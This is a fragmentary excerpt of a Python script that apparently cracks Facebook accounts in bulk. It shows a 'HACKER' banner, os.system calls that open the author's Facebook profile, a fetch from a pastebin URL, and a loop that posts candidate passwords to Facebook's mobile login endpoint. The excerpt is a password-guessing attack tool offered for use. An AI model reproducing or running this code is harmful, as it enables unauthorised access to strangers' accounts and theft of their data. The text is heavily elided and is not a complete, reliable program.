...
os.system('am start https://www.facebook.com/profile.php?id=100019928724396&mibextid=ZbWKwL')
...
try:
    ...
    os.system("xdg-open https://www.facebook.com/profile.php?id=100019928724396&mibextid=ZbWKwL")
...
def subc():
   ...
   ses=requests.get("https://pastebin.com/WufL6Wwq").text
...
os.system('xdg-open https://www.facebook.com/profile.php?id=100019928724396')
...
░░░░░   ░░░░░ ░░░░░░░░░░░  ░░░░░░░░░░      ░░░░░░░    
  ...
  LIFE STATUS  :  ABDO-2000

  FB GROUP  : ABDO HACKER 0004
...
def xyz():
    ...
    print(f"{BLUE}[01] {GREEN}RANDOM CLONE LBYIA  M1")
    ...
    try:
        ...
        for ps in pwx:
            ...
            lo = session.post(
                ...
                'https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',
